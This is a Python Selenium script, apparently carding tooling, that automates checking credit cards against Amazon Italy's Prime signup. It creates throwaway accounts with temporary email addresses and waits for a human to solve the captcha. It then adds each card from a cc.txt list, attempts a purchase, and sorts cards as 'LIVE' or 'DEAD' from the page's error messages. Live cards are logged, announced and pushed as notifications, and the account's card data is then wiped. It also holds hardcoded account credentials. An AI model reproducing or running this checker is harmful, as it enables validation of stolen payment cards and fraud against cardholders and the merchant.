from copy import error
from logging import ERROR
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import *
from time import sleep, time
from notify_run import Notify
from colorama import *
from playsound import playsound
from string import ascii_letters
from random import choice, randint
import threading
import names
import os
import wmi
import sys

class Gate_amazon:

    def __init__(self, status, delete = True):
        
        if status == 0:
            try:
                init()
                #sys.tracebacklimit = 0     #Manejo de excepcioneswa
                now = time()
                #Cargando ccs
                self.load_cctxt('a')
                self.crearlinea()
                print(Fore.LIGHTBLUE_EX, 'Cargando CCs', Fore.WHITE)
                print(Fore.LIGHTBLUE_EX, 'Cargando Gate', Fore.WHITE)
                
                self.webdriver_chromeoptions()
                #Temp page
                path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
                self.__browser221 = webdriver.Chrome(path, options=self.chrome_options)   #Crea la interfaz con las opciones
                
                self.__browser221.get('https://embedded.cryptogmail.com/')
                self.crypto_mail()

                #Amazon page
                self.__driver = webdriver.Chrome(path, options=self.chrome_options)   #Crea interfaz con las opciones
                self.__driver.get("https://www.amazon.it/gp/prime/pipeline/membersignup")  #Carga la web 
                error = self.registroamazon()    #Se registra en amazon
                #self.load_mailtxt()             # Buscar correos

                if error == False:
                    error = False
                    try:
                        WebDriverWait(self.__driver, 120).until(EC.element_to_be_clickable((By.LINK_TEXT, 'Aggiungi una carta di credito o di debito')))
                    except:
                        error = True

                    if error == False:
                        try:
                            self.__driver.find_element(By.ID, 'sp-cc-accept').click()
                        finally:
                            self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
                            
                            WebDriverWait(self.__driver, 10).until(EC.presence_of_element_located((By.XPATH, ".//iframe[contains(@name,'ApxSecureIframe')]")))
                            self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))


                    print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60)
                else:
                    print(Fore.RED, "CAN'T SIGN UP ACCOUNT", Fore.WHITE)
                    #self.__driver.quit()
                    print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60)

            except WebDriverException as ex:
                print(Fore.RED, ex.msg[14:], Fore.WHITE)
        
        elif status == 1:
            
            init()
            #sys.tracebacklimit = 0     #Manejo de excepcioneswa
            now = time()
            #Cargando ccs
            self.load_cctxt('a')
            self.crearlinea()
            print(Fore.LIGHTBLUE_EX, 'Cargando CCs', Fore.WHITE)
            print(Fore.LIGHTBLUE_EX, 'Cargando Gate', Fore.WHITE)

            self.webdriver_chromeoptions()
            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
            self.__driver = webdriver.Chrome(path, options=self.chrome_options)
            self.__driver.get('https://www.amazon.it/gp/prime/pipeline/membersignup')
            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132121716')
            self.__driver.find_element(By.ID, 'ap_password').send_keys('ColombiaSOS2021')
            self.__driver.find_element(By.ID, 'signInSubmit').click()
            
            #a??adir cc
            error = False
            try:
                self.__driver.find_element(By.ID, 'sp-cc-accept').click()
            except:
                pass
            finally:
                if delete == True:

                    while True:
                        try:
                            WebDriverWait(self.__driver, 4).until(EC.element_to_be_clickable((By.LINK_TEXT, 'Aggiungi una carta di credito o di debito')))
                            self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
                            break
                        except (NoSuchElementException, TimeoutException):
                            print(Fore.YELLOW, 'CLEANING ACCOUNT DATA, WAIT A FEW SECONDS...')
                            self.delete_data()
                            self.__driver.get('https://www.amazon.it/gp/prime/pipeline/membersignup')
                            self.__driver.implicitly_wait(2)
                        
                    
                    WebDriverWait(self.__driver, 10).until(EC.presence_of_element_located((By.XPATH, ".//iframe[contains(@name,'ApxSecureIframe')]")))
                    self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))
                    self.finish = False
                    timer0 = threading.Timer(0, self.fillcc1())
                    timer0.start()
                    while True:
                        try:
                            if self.finish == True:
                                print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60, Fore.WHITE)
                                self.delete_data()
                                self.__driver.quit()
                                break
                        except:
                            pass
                else: 
                    
                    timer0 = threading.Timer(0, self.recheck())
                    timer0.start()
                    while True:
                        try:
                            if self.finish == True:
                                WebDriverWait(self.__driver, 4).until(EC.element_to_be_clickable((By.LINK_TEXT, 'Aggiungi una carta di credito o di debito')))
                                print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60, Fore.WHITE)
                                break
                        except:
                            self.__driver.quit()
        elif status == 2:
            init()
            #sys.tracebacklimit = 0     #Manejo de excepcioneswa
            now = time()
            #Cargando ccs
            self.load_cctxt('a')
            self.crearlinea()
            print(Fore.LIGHTBLUE_EX, 'Cargando CCs', Fore.WHITE)
            print(Fore.LIGHTBLUE_EX, 'Cargando Gate', Fore.WHITE)

            self.webdriver_chromeoptions()
            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
            self.__driver = webdriver.Chrome(path, options=self.chrome_options)
            self.__driver.get('https://www.amazon.it/gp/prime/pipeline/membersignup')
            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132121716')
            self.__driver.find_element(By.ID, 'ap_password').send_keys('ColombiaSOS2021')
            self.__driver.find_element(By.ID, 'signInSubmit').click()
            sleep(5)
            timer0 = threading.Timer(0, self.delete_data())
            timer0.start()
            while True:
                try:
                    if self.finish == True:
                        print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60, Fore.WHITE)
                        self.__driver.quit()
                        break
                except:
                    pass
          
    def load_cctxt(self, e):
        if e == 'a':
            ccs = open("cc.txt", "r+")
            self.ccs = ccs.readlines()        
            self.indice_ultima = len(self.ccs) 
            self.count_cc = self.indice_ultima
            ccs.close()

        elif e == 'd':
            ccs = open("cc.txt", "r+")
            self.ccs = ccs.readlines()        
            self.indice_ultima = len(self.ccs) 
            self.count_cc = self.indice_ultima
            ccs.close()

    def crearlinea(self):
        file = [s.rstrip() for s in self.ccs]
        self.index_cc = self.indice_ultima - self.count_cc
        self.cc = file[self.index_cc].split("|")
        self.cc1 = self.cc[0]
        self.mes = self.cc[1] 
        self.anio = self.cc[2]
        try:
            self.cvv = self.cc[3]
        except IndexError:
            self.cvv = 000
        self.count_cc -= 1
        

    def delete_line(self):
        a_file = open("cc_account.txt", "r") 
        lines = a_file.readlines()
        a_file. close()
        new_file = open("sample.txt", "w+") 
        for line in lines:
            if line.strip() != (self.cc1+"|"+self.mes+"|"+self.anio+"|"+self.cvv):
                new_file.write(line)
        new_file. close()        

    def webdriver_chromeoptions(self):
        #Inica el API WEBDRIVER CHROME para ajustar las opciones
        self.chrome_options = webdriver.ChromeOptions()
        
        # Agrega los opciones del navegador
        self.chrome_options.add_argument("--disable-extensions")
        self.chrome_options.add_argument("--disable-infobars")
        self.chrome_options.add_argument("--disable-popup-blocking")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument('--incognito')
        self.chrome_options.add_argument("--window-size=800,600")
        #self.chrome_options.add_argument("--headless")                  #Ocultar navegador
        #self.chrome_options.add_argument('--no-sandbox')               #Only linux
        self.chrome_options.add_argument('--ignore-certificate-errors')
        self.chrome_options.add_argument('--disable-dev-shm-usage')

        self.chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])

    def crypto_mail(self):

        print(Fore.WHITE,"CREATING EMAIL...", Fore.WHITE)                                  

        WebDriverWait(self.__browser221, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/div[1]/div/div[2]/a[3]")))
        sleep(2)
        self.__browser221.find_element_by_xpath("/html/body/div/div[1]/div/div[2]/a[3]").click()
        user = ''.join(choice(ascii_letters) + str(randint(0, 9)) for i in range(15))
        WebDriverWait(self.__browser221, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="_tm_changeEmail"]/div/div[2]/div/div/input')))
        self.__browser221.find_element(By.XPATH, '//*[@id="_tm_changeEmail"]/div/div[2]/div/div/input').send_keys(user)
        sleep(2)
        self.__browser221.find_element(By.PARTIAL_LINK_TEXT, 'Save').click()

        WebDriverWait(self.__browser221, 15).until(EC.presence_of_element_located((By.XPATH, '/html/body/div/div[1]/div/div[1]/div')))
        mail = self.__browser221.find_element_by_xpath('/html/body/div/div[1]/div/div[1]/div')
        self.correitotemp = mail.text
        
        while True:
            pass

    def tempmail(self):

        print(Fore.WHITE,"CREATING EMAIL...", Fore.WHITE)
        self.__browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue
        user = self.__browser221.find_element_by_id("userName")
        domain = self.__browser221.find_element_by_id('domainName2')
        user_value = user.get_attribute("value")
        domain_value = domain.get_attribute("value")
        self.correitotemp = user_value+"@"+domain_value

    def refill_register(self):
        self.__driver.find_element(By.NAME, 'email').clear()
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

    def optcode_cryto(self):
                                                                                        #'.//iframe[contains(@name,'ApxSecureIframe')]
        WebDriverWait(self.__browser221, 30).until(EC.element_to_be_clickable((By.XPATH, ".//div[contains(@onclick, '_temp_mail.openEmail')]")))
        self.__browser221.find_element(By.XPATH, ".//div[contains(@onclick, '_temp_mail.openEmail')]").click()
        print("Abrio")
        WebDriverWait(self.__browser221, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'otp')))
        codiguito = self.__browser221.find_element_by_class_name("otp")
        print("Encontro otp")
        codiguito2 = codiguito.text
        print(codiguito)
        self.__driver.find_element(By.NAME, 'code').send_keys(codiguito2)
        self.__driver.find_element(By.CLASS_NAME, 'a-button-input').click()
        self.__browser221.quit()

    def otpcode_tempm(self):
        
        self.__browser221.refresh()
        codiguito = self.__browser221.find_element_by_class_name("otp")
        codiguito2 = codiguito.text
        self.__driver.find_element(By.NAME, 'code').send_keys(codiguito2)
        self.__driver.find_element(By.CLASS_NAME, 'a-button-input').click()
        self.__browser221.quit()

    def load_mailtxt(self):
        print(Fore.CYAN +"SIGNING UP ACCOUNT ", Fore.WHITE)
        WebDriverWait(self.__driver, 30).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="createAccountSubmit"]')))
        #Click para registrarse
        self.__driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

        #Llena el formulario de registro
        self.__driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

        #espera a que cargue la ventana de captcha
        self.__driver.implicitly_wait(10)
        i=0
        while True:
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Errore interno. Riprova pi?? tardi" in bodyText0:
                print(Fore.YELLOW + str(i) + " CHANGING EMAIL", Fore.WHITE)
                i+=1
                self.__browser221.get("https://tempm.com/email-generator") #Carga la web
                self.tempmail()  #Extrae datos del mail
                self.refill_register()
                error = True
            else:
                error = False
                break
        
        if error == False:
            print(Fore.GREEN, self.correitotemp, Fore.WHITE)
            mailtxt = open("dominemail.txt", "a")
            mailtxt.write(f"\n{self.correitotemp}")
            mailtxt.close()
            self.__driver.quit()
            self.__browser221.quit()

    def registroamazon(self):

        print(Fore.CYAN +"SIGNING UP ACCOUNT ", Fore.WHITE)
        WebDriverWait(self.__driver, 30).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="createAccountSubmit"]')))
        #Click para registrarse
        self.__driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

        #Llena el formulario de registro
        self.__driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

        #espera a que cargue la ventana de captcha
        self.__driver.implicitly_wait(10)
        for i in range(3):
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Errore interno. Riprova pi?? tardi" in bodyText0:
                print(Fore.YELLOW + str(i) + " ERROR, CHANGING EMAIL", Fore.WHITE)
                i+=1
                
                self.__browser221.get('https://embedded.cryptogmail.com/')
                self.crypto_mail()
                self.refill_register()
                error = True
            else:
                error = False
                break

        if error == False:
            print(Fore.GREEN, self.correitotemp, Fore.WHITE)
            # Cambia el foco al iframe
            self.__driver.implicitly_wait(10)
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Risolvi questo puzzle per proteggere il tuo account" in bodyText0:
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="CaptchaFrame"]'))         #Tercer frame
                # Ahora podemos hacer clic en el bot??n'
                self.__driver.find_element(By.XPATH, '//*[@id="home_children_button"]').click()
                self.__driver.switch_to.default_content()
                
                #Espera respuestas al aceptar el captcha
                try:
                    print(Fore.BLUE, 'WAITING TO THE USER SOLVE THE CAPTCHA', Fore.WHITE)
                    WebDriverWait(self.__driver, 150).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
                except:
                    error = True

                if error == False:
                    print(Fore.BLUE, 'WAITING OTP', Fore.WHITE)
                    try:
                        self.optcode_cryto()
                    except:
                        error = True

                    if error == False:
                        print(Fore.CYAN +"OTP SOLVED", Fore.WHITE)
                                             
                    else:
                        print(Fore.RED, 'OTP ERROR', Fore.WHITE)
                        return True
                else:
                    print(Fore.RED, 'Captcha no resuelto', Fore.WHITE)
                    return True
            else:
                print(Fore.RED, 'Error al cargar el captcha', Fore.WHITE)
                return True
        else:
            print(Fore.RED, 'Error al crear la cuenta (mail)', Fore.WHITE)
            return True


    def buttonsfill(self):
        WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.NAME, 'ppw-widgetEvent:SelectAddressEvent')))
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:SelectAddressEvent').click()
        while True:
            try:
                WebDriverWait(self.__driver, 30).until(EC.element_to_be_clickable((By.XPATH, (f".//span[contains(@data-number, '{self.cc1[len(self.cc1)-4:]}')]"))))
                break
            except NoSuchWindowException:
                pass
        self.__driver.find_element(By.XPATH, (f".//span[contains(@data-number, '{self.cc1[len(self.cc1)-4:]}')]")).click()
        WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent')))
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent').click()
        timer3 = threading.Timer(0, self.pagar)
        timer3.start()


    def refill(self):

        error = False
        while True:
            try:
                WebDriverWait(self.__driver, 2).until(EC.visibility_of_element_located((By.NAME, 'ppw-accountHolderName')))
                break
            except NoSuchWindowException:
                pass
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys(f"Pandorita Quintana")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-updateEverywhereAddCreditCard').click()
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
        try:
            WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.NAME, 'ppw-widgetEvent:SelectAddressEvent')))
            error = False
        except:
            error = True
        
        if error == False:
            print(Fore.BLUE +"ADDING CC", Fore.WHITE)
            timer5 = threading.Timer(0, self.buttonsfill)
            timer5.start()
        else:
            print(Fore.RED, 'CC DATA ERROR', Fore.WHITE)
            try:
                self.__driver.find_element(By.NAME, 'ppw-accountHolderName').clear()
                self.__driver.find_element(By.NAME, 'addCreditCardNumber').clear()
                self.crearlinea()
                timer0 = threading.Timer(0, self.refill())
                timer0.start()
            except NoSuchElementException:
                self.__driver.refresh()
                timer0 = threading.Timer(0, self.recheck())
                timer0.start()
                   

    def recheck(self):
        try:
            WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[2]/div/div[4]/div[2]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input')))
            self.__driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div[4]/div[2]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input').click()

        except:
            WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div[2]/div[2]/div[4]/div[2]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input")))
            self.__driver.find_element_by_xpath("/html/body/div[1]/div[2]/div[2]/div[4]/div[2]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input").click()
                                        
        WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.LINK_TEXT, 'Aggiungi una carta di credito o di debito')))
        self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
        
        WebDriverWait(self.__driver, 10).until(EC.presence_of_element_located((By.XPATH, ".//iframe[contains(@name,'ApxSecureIframe')]")))
        self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))

        timer4 = threading.Timer(0, self.refill)
        timer4.start()

    def guardar_live(self):
        live_cc = open("lives.txt", "a")
        live_cc.write('\n'+self.cc1+"|"+self.mes+"|"+self.anio+"|"+self.cvv)
        live_cc.close()

    def save_cc_account(self):
        cc = open("cc_account.txt", "a")
        cc.write('\n'+self.cc1+"|"+self.mes+"|"+self.anio+"|"+self.cvv)
        cc.close()

    def verificar(self):
        print(Fore.BLUE, 'CHECKING...', Fore.WHITE)
        WebDriverWait(self.__driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="a-page"]/div[1]')))
        bodyText = self.__driver.find_element_by_tag_name('body').text
        
        if "Si ?? verificato un errore durante la convalida del metodo di pagamento. Aggiorna o aggiungi un nuovo metodo di pagamento e riprova." in bodyText:
            print(Fore.RED, (self.indice_ultima-self.count_cc), " DEAD " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv, Fore.WHITE)
            self.save_cc_account()
            try:
                self.crearlinea()
                timer2 = threading.Timer(0, self.recheck)
                timer2.start()
            except IndexError:
                print(Fore.LIGHTGREEN_EX, 'CHECKOUT COMPLETED', Fore.WHITE)
                self.finish = True

        elif "Siamo spiacenti, ma solo i clienti con un indirizzo di fatturazione italiano possono iscriversi a Prime su Amazon.it" in bodyText:
            self.guardar_live()
            self.save_cc_account()
            playsound(os.path.realpath('mario_live.wav'))
            print(Fore.GREEN + " PXNDORXS_CHK LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv, Fore.WHITE)
            notify = Notify()
            notify.register()
            notify.send(" LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv)
            try:
                self.crearlinea()
                timer2 = threading.Timer(0, self.recheck)
                timer2.start()
            except IndexError:
                print(Fore.LIGHTGREEN_EX, 'CHECKOUT COMPLETED', Fore.WHITE)
                self.finish = True
        
        
            
    def pagar(self):               
        
        print(Fore.BLUE, 'BUYING PRIME...', Fore.WHITE)
        while True:
            try:
                WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[2]/div/div[4]/div[4]/div/div/div[1]/div/span/span/span')))
                break
            except NoSuchWindowException:
                pass
        self.__driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div/div[4]/div[4]/div/div/div[1]/div/span/span/span').click()
        timer1 = threading.Timer(4, self.verificar)     
        timer1.start()

    def filladress(self):
        #DATA ADRESS AND PAY
        print(Fore.BLUE + "ADDING ADDRESS", Fore.WHITE)
        
        WebDriverWait(self.__driver, 10).until(EC.presence_of_element_located((By.NAME, 'ppw-line1')))
        
        self.__driver.find_element(By.NAME, 'ppw-line1').send_keys("20 Wyckoff Ave")
        self.__driver.find_element(By.NAME, 'ppw-city').send_keys("New York")
        self.__driver.find_element(By.NAME, 'ppw-stateOrRegion').send_keys("NY")
        self.__driver.find_element(By.NAME, 'ppw-postalCode').send_keys("07463")
        self.__driver.find_element(By.NAME, 'ppw-phoneNumber').send_keys("2014478300")
        self.__driver.find_element(By.NAME, 'ppw-countryCode').send_keys("Stati Uniti")
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddAddressEvent').click()
        
        WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.NAME, 'ppw-widgetEvent:UseSuggestedAddressEvent')))
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:UseSuggestedAddressEvent').click()
        self.pagar()
            
            
        

    def fillcc1(self):
        #DATACC
        while True:
            try:
                WebDriverWait(self.__driver, 10).until(EC.visibility_of_element_located(((By.NAME, 'ppw-accountHolderName'))))
                break
            except NoSuchWindowException:
                pass
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys(f"Pandorita Quintana")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-updateEverywhereAddCreditCard').click()
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
                                                                                       
        
        try:            
            print(Fore.BLUE +"ADDING CC", Fore.WHITE)
            WebDriverWait(self.__driver, 5).until(EC.presence_of_element_located((By.NAME, 'ppw-line1')))
            error = False
        except TimeoutException:
            error = True

        if error == False:
            timer7 = threading.Timer(0, self.filladress)
            timer7.start()
        else:
            print(Fore.RED, 'CC DATA ERROR', Fore.WHITE)
            self.__driver.find_element(By.NAME, 'ppw-accountHolderName').clear()
            self.__driver.find_element(By.NAME, 'addCreditCardNumber').clear()
            self.crearlinea()
            timer0 = threading.Timer(0, self.fillcc1())
            timer0.start()




    def delete_data(self):
        print(Fore.BLUE, 'DELETE USER DATA', Fore.WHITE)
        try:
            self.__driver.get('https://www.amazon.it/a/addresses?ref_=ya_d_c_addr')
            WebDriverWait(self.__driver, 5).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="ya-myab-edit-address-desktop-row-0"]/span')))
            self.__driver.find_element(By.XPATH, '//*[@id="ya-myab-edit-address-desktop-row-0"]/span').click()
            WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[3]/div/div/div/div/div[4]/div[2]/div/div[2]/form/span/span/input')))
            self.__driver.find_element(By.XPATH, '/html/body/div[3]/div/div/div/div/div[4]/div[2]/div/div[2]/form/span/span/input').click()
            
            self.__driver.implicitly_wait(2)
        except:
            print(Fore.RED, 'ADRESS DONT FOUND', Fore.WHITE)

        try:
            self.__driver.get('https://www.amazon.it/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo')
            while True: 
                try:
                    WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[2]/div[4]/div/div/div[2]/div/div/form/div[1]/div/div[2]/div[1]/div/a')))
                    #
                    self.__driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[4]/div/div/div[2]/div/div/form/div[1]/div/div[2]/div[1]/div/a').click()
                    self.__driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div[4]/div/div/div[2]/div/div/form/div[1]/div/div[2]/div[1]/div/div/div[3]/div[2]/span[2]/span/input').click()
                    
                    WebDriverWait(self.__driver, 10).until(EC.element_to_be_clickable((By.NAME, 'ppw-widgetEvent:DeleteInstrumentEvent')))
                    self.__driver.find_element(By.NAME, 'ppw-widgetEvent:DeleteInstrumentEvent').click()
                    
                    self.__driver.implicitly_wait(3)
                    self.__driver.refresh()
                except:
                    print(Fore.RED, 'CCs DELETEDS', Fore.WHITE)
                    break
        finally:
            print(Fore.RED, 'CCs DONT FOUND', Fore.WHITE)
        self.finish = True

def get_disk_serial():
        
    c = wmi.WMI()
    hddSerialNumber = c.Win32_PhysicalMedia()[0].wmi_property('SerialNumber').value.strip()
    return hddSerialNumber

Start = Gate_amazon(1, True)
print(get_disk_serial())